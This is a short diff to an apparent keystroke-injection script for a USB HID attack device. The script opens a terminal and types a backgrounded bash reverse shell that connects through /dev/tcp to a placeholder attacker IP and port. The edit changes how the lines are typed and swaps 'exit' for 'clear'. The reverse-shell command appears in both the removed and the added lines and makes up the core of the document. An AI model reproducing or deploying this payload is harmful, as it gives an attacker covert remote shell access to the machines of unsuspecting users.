@@ -1,8 +1,4 @@
 Press:131+32
-Print:terminal
-Press:176
-CustomDelay:100
-Print:nohup bash -c "bash -i >& /dev/tcp/<Attacker_IP>/<port> 0>&1 &" >/dev/null 2>&1; exit
-Press:176
-CustomDelay:100
-Press:131+81
+PrintLine:terminal
+PrintLine:nohup bash -c "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1 &" >/dev/null 2>&1; clear
+Press:131+113
